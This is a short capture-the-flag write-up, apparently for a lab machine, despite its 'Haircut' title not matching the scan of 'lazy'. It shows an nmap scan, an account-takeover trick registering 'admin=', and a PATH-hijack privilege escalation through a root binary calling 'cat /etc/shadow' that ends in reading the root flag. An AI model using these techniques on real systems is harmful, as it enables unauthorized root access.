# Haircut

## Information Gathering

Running nmap
```
# Nmap 7.70 scan initiated Fri Jul 19 10:47:41 2019 as: nmap -sV -sC -oA nmap/lazy 10.10.10.18
Nmap scan report for 10.10.10.18
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 e1:92:1b:48:f8:9b:63:96:d4:e5:7a:40:5f:a4:c8:33 (DSA)
|   2048 af:a0:0f:26:cd:1a:b5:1f:a7:ec:40:94:ef:3c:81:5f (RSA)
|   256 11:a3:2f:25:73:67:af:70:18:56:fe:a2:e3:54:81:e8 (ECDSA)
|_  256 96:81:9c:f4:b7:bc:1a:73:05:ea:ba:41:35:a4:66:b7 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: CompanyDev
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We can see web server on port 80.

## Exploitation

Because of poor character filtration We can register user "admin=", "=" will be filtered out and we will get admin account eventually.
On admin page we can find the link to ssh private key.

## PrivEsc
There is a binary in user's category called "backup".
If we run strings command we can see this line:
```
cat /etc/shadow
```
There is no full path of cat, so we can privesc by redefining the command. This can be achieved by setting the working
directory as the first option in PATH, with the command
```
export PATH=.:$PATH
```
After this, creating a file named cat in the working directory will cause the file to be executed by the root user. In this case, a bash script will do the trick. Note, do not use the cat command in the script as this will cause the script to loop endlessly. Don’t forget to chmod +x ./cat before running
the backup binary. The script below creates a copy of the root flag in the home directory
```
#! /bin/bash
more /root/root.txt > /tmp/root.txt
```
